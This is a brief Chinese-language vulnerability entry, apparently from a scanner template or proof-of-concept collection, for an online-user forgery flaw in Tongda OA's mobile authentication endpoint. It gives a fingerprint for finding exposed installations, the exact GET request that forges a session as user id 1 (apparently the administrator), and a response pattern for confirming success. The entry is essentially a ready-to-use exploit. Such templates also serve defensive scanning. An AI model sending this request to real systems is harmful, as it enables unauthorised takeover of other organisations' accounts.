# 通达OAauth_mobi在线用户伪造漏洞

通达OA ｜ 其他 ｜ —
- **指纹**：`title="office Anywhere"`
- **请求**：`GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1`
- **响应特征**：200 ^(?!.*?RELOGIN).*?$